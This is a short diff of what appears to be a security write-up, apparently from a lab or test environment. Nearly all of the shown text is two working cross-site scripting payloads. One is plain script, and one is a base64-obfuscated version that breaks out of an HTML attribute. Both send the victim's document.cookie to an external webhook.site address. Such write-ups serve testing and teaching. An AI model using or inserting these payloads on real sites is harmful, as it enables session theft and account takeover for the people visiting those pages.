@@ -31,9 +31,9 @@ Accessed via http://localhost:8055/repository/root/ giving us complete read acce
 
 <br>
 <br>
-```
-<script>document.write('<img src="https://webhook.site/5f41dc6d-6532-41ec-90c5-a597ad8975b5?c='+document.cookie+'" />');</script>
-```
+
+```<script>document.write('<img src="https://webhook.site/5f41dc6d-6532-41ec-90c5-a597ad8975b5?c='+document.cookie+'" />');</script>```
+
 
 ```
 x"><img%20src="x"%20onerror="javascript:eval(atob('PHNjcmlwdD4KZG9jdW1lbnQud3JpdGUoJzxpbWcgc3JjPSJodHRwczovL3dlYmhvb2suc2l0ZS81ZjQxZGM2ZC02NTMyLTQxZWMtOTBjNS1hNTk3YWQ4OTc1YjU%2FYz0nK2RvY3VtZW50LmNvb2tpZSsnIiAvPicpOwo8L3NjcmlwdD4='))">
